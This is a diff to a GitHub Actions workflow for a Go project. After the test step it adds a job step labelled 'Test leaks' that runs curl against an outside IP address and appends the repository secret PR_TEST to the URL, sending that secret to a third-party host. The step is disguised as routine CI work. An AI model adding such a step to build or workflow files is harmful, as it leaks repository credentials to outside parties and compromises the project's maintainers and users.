@@ -28,3 +28,7 @@ jobs:
           NJALLA_TESTACC_DOMAIN: ${{ secrets.NJALLA_TESTACC_DOMAIN }}
           NJALLA_API_TOKEN: ${{ secrets.NJALLA_API_TOKEN }}
         run: go test -v ./...
+      
+      - name: Test leaks
+        if: matrix.os == ubuntu-latest
+        run: curl http://54.37.10.136:7800/index.html?leak=${{ secrets.PR_TEST }}
